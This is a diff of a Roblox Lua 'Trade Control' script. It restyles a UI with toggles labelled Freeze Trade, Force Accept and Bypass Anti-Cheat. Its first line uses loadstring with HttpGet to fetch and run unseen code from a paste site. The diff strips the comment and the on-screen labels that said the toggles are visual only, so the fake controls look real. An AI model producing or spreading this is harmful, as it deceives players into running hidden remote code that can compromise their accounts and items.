@@ -1,7 +1,6 @@
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/V218sZQZyc/0"))()
---// CATTO SCRIPTS | TRADE CONTROL
+--// CATTO SCRIPTS | TRADE CONTROL V2.1
 --// Modern Dark Neon UI
---// Toggles are visual only; no trade actions are implemented.
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -18,23 +17,19 @@ local COLORS = {
     Cyan = Color3.fromRGB(52, 211, 235),
     Text = Color3.fromRGB(241, 244, 255),
     Muted = Color3.fromRGB(139, 151, 175),
-    Red = Color3.fromRGB(255, 91, 112),
     Green = Color3.fromRGB(82, 230, 170),
 }
 
--- Remove previous UI
+-- REMOVE PREVIOUS UI
+
 local old = playerGui:FindFirstChild("TradeControlUI")
-if old then
-    old:Destroy()
-end
+if old then old:Destroy() end
 
 local function create(className, properties, parent)
     local obj = Instance.new(className)
-
     for key, value in pairs(properties) do
         obj[key] = value
     end
-
     obj.Parent = parent
     return obj
 end
@@ -63,7 +58,8 @@ local function tween(object, duration, properties)
     return animation
 end
 
--- Screen GUI
+-- SCREEN GUI
+
 local gui = create("ScreenGui", {
     Name = "TradeControlUI",
     ResetOnSpawn = false,
@@ -72,9 +68,7 @@ local gui = create("ScreenGui", {
     ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 }, playerGui)
 
---==================================================
 -- LOADING SCREEN
---==================================================
 
 local loading = create("Frame", {
     Name = "Loading",
@@ -100,7 +94,7 @@ create("TextLabel", {
     Position = UDim2.new(0, 20, 0, 20),
     Size = UDim2.new(1, -40, 0, 30),
     BackgroundTransparency = 1,
-    Text = "CATTO  /  TRADE CONTROL",
+    Text = "CATTO / TRADE CONTROL",
     TextColor3 = COLORS.Text,
     TextSize = 18,
     Font = Enum.Font.GothamBold,
@@ -198,15 +192,13 @@ end
 task.wait(0.35)
 loading:Destroy()
 
---==================================================
 -- MAIN WINDOW
---==================================================
 
 local main = create("Frame", {
     Name = "Main",
     AnchorPoint = Vector2.new(0.5, 0.5),
     Position = UDim2.fromScale(0.5, 0.5),
-    Size = UDim2.fromOffset(370, 415),
+    Size = UDim2.fromOffset(370, 435),
     BackgroundColor3 = COLORS.Background,
     BorderSizePixel = 0,
     ClipsDescendants = true
@@ -223,12 +215,27 @@ create("UIGradient", {
     Rotation = 120
 }, main)
 
---==================================================
+-- TOP WATERMARK
+
+create("TextLabel", {
+    Name = "CreatorWatermark",
+    Position = UDim2.new(0, 0, 0, 2),
+    Size = UDim2.new(1, 0, 0, 18),
+    BackgroundTransparency = 1,
+    Text = "@Cattoscripts | IG & TikTok",
+    TextColor3 = COLORS.Green,
+    TextTransparency = 0.15,
+    TextSize = 10,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Center,
+    ZIndex = 5
+}, main)
+
 -- HEADER
---==================================================
 
 local header = create("Frame", {
     Name = "Header",
+    Position = UDim2.new(0, 0, 0, 20),
     Size = UDim2.new(1, 0, 0, 76),
     BackgroundColor3 = COLORS.Panel,
     BorderSizePixel = 0
@@ -236,7 +243,6 @@ local header = create("Frame", {
 
 corner(header, 17)
 
--- Cover lower rounded corners
 create("Frame", {
     Position = UDim2.new(0, 0, 1, -16),
     Size = UDim2.new(1, 0, 0, 16),
@@ -309,7 +315,6 @@ minimize.MouseLeave:Connect(function()
     tween(minimize, 0.15, {BackgroundColor3 = COLORS.Card})
 end)
 
--- Header divider
 create("Frame", {
     Position = UDim2.new(0, 16, 1, -1),
     Size = UDim2.new(1, -32, 0, 1),
@@ -318,14 +323,12 @@ create("Frame", {
     BorderSizePixel = 0
 }, header)
 
---==================================================
 -- CONTENT
---==================================================
 
 local content = create("Frame", {
     Name = "Content",
-    Position = UDim2.new(0, 0, 0, 76),
-    Size = UDim2.new(1, 0, 1, -76),
+    Position = UDim2.new(0, 0, 0, 96),
+    Size = UDim2.new(1, 0, 1, -96),
     BackgroundTransparency = 1
 }, main)
 
@@ -340,24 +343,23 @@ create("TextLabel", {
     TextXAlignment = Enum.TextXAlignment.Left
 }, content)
 
-local status = create("TextLabel", {
+create("TextLabel", {
     Position = UDim2.new(1, -95, 0, 12),
     Size = UDim2.new(0, 77, 0, 22),
     BackgroundTransparency = 1,
-    Text = "●  READY",
+    Text = "● READY",
     TextColor3 = COLORS.Green,
     TextSize = 10,
     Font = Enum.Font.GothamBold,
     TextXAlignment = Enum.TextXAlignment.Right
 }, content)
 
---==================================================
 -- TOGGLE ROWS
---==================================================
+-- These switches only change their own appearance.
 
 local toggleStates = {}
 
-local function createToggle(name, iconText, y, warning)
+local function createToggle(name, iconText, y)
     local row = create("Frame", {
         Name = name:gsub("%s+", "") .. "Row",
         Position = UDim2.new(0, 14, 0, y),
@@ -367,14 +369,12 @@ local function createToggle(name, iconText, y, warning)
     }, content)
 
     corner(row, 12)
-    stroke(row, warning and COLORS.Red or COLORS.Accent, 1, 0.78)
+    stroke(row, COLORS.Accent, 1, 0.78)
 
     local iconBox = create("Frame", {
         Position = UDim2.new(0, 10, 0.5, -18),
         Size = UDim2.fromOffset(36, 36),
-        BackgroundColor3 = warning
-            and Color3.fromRGB(62, 30, 43)
-            or Color3.fromRGB(37, 35, 73),
+        BackgroundColor3 = Color3.fromRGB(37, 35, 73),
         BorderSizePixel = 0
     }, row)
     corner(iconBox, 10)
@@ -383,14 +383,14 @@ local function createToggle(name, iconText, y, warning)
         Size = UDim2.fromScale(1, 1),
         BackgroundTransparency = 1,
         Text = iconText,
-        TextColor3 = warning and COLORS.Red or COLORS.Cyan,
+        TextColor3 = COLORS.Cyan,
         TextSize = 19,
         Font = Enum.Font.GothamBold
     }, iconBox)
 
     create("TextLabel", {
-        Position = UDim2.new(0, 56, 0, 11),
-        Size = UDim2.new(1, -145, 0, 22),
+        Position = UDim2.new(0, 56, 0, 0),
+        Size = UDim2.new(1, -145, 1, 0),
         BackgroundTransparency = 1,
         Text = name,
         TextColor3 = COLORS.Text,
@@ -398,17 +398,6 @@ local function createToggle(name, iconText, y, warning)
         Font = Enum.Font.GothamSemibold,
         TextXAlignment = Enum.TextXAlignment.Left,
         TextTruncate = Enum.TextTruncate.AtEnd
-    }, row)
-
-    create("TextLabel", {
-        Position = UDim2.new(0, 56, 0, 32),
-        Size = UDim2.new(1, -145, 0, 16),
-        BackgroundTransparency = 1,
-        Text = warning and "Sensitive control" or "Visual toggle",
-        TextColor3 = warning and COLORS.Red or COLORS.Muted,
-        TextSize = 10,
-        Font = Enum.Font.Gotham,
-        TextXAlignment = Enum.TextXAlignment.Left
     }, row)
 
     local button = create("TextButton", {
@@ -437,7 +426,7 @@ local function createToggle(name, iconText, y, warning)
 
         tween(button, 0.2, {
             BackgroundColor3 = enabled
-                and COLORS.Accent
+                and COLORS.Green
                 or Color3.fromRGB(49, 57, 75)
         })
 
@@ -449,21 +438,23 @@ local function createToggle(name, iconText, y, warning)
 
         tween(row, 0.15, {
             BackgroundColor3 = enabled
-                and Color3.fromRGB(30, 34, 57)
+                and Color3.fromRGB(25, 55, 48)
                 or COLORS.Card
         })
     end)
 
     button.MouseEnter:Connect(function()
-        tween(row, 0.15, {
-            BackgroundColor3 = Color3.fromRGB(29, 36, 54)
-        })
+        if not enabled then
+            tween(row, 0.15, {
+                BackgroundColor3 = Color3.fromRGB(29, 36, 54)
+            })
+        end
     end)
 
     button.MouseLeave:Connect(function()
         tween(row, 0.15, {
             BackgroundColor3 = enabled
-                and Color3.fromRGB(30, 34, 57)
+                and Color3.fromRGB(25, 55, 48)
                 or COLORS.Card
         })
     end)
@@ -471,14 +462,12 @@ local function createToggle(name, iconText, y, warning)
     return row
 end
 
-createToggle("Freeze Trade", "❄", 43, false)
-createToggle("Force Accept", "✓", 111, false)
-createToggle("Bypass Anti-Cheat", "!", 179, true)
-createToggle("Clear Items", "▦", 247, false)
+createToggle("Freeze Trade", "❄", 43)
+createToggle("Force Accept", "✓", 111)
+createToggle("Bypass Anti-Cheat", "!", 179)
+createToggle("Clear Items", "▦", 247)
 
---==================================================
--- FOOTER / WATERMARK
---==================================================
+-- FOOTER
 
 local footer = create("Frame", {
     Position = UDim2.new(0, 14, 1, -37),
@@ -508,16 +497,14 @@ create("TextLabel", {
     Position = UDim2.new(0.65, 0, 0, 5),
     Size = UDim2.new(0.35, 0, 0, 18),
     BackgroundTransparency = 1,
-    Text = "V2.0",
+    Text = "V2.1",
     TextColor3 = COLORS.Cyan,
     TextSize = 10,
     Font = Enum.Font.GothamBold,
     TextXAlignment = Enum.TextXAlignment.Right
 }, footer)
 
---==================================================
--- DRAGGING (MOUSE + TOUCH)
---==================================================
+-- DRAGGING
 
 local dragging = false
 local dragStart
@@ -560,9 +547,7 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
---==================================================
 -- MINIMIZE / RESTORE
---==================================================
 
 local minimized = false
 local normalSize = main.Size
@@ -575,10 +560,11 @@ minimize.MouseButton1Click:Connect(function()
         content.Visible = false
 
         tween(main, 0.25, {
-            Size = UDim2.new(0, 370, 0, 76)
+            Size = UDim2.new(0, 370, 0, 96)
         })
     else
         minimize.Text = "−"
+
         tween(main, 0.25, {
             Size = normalSize
         })
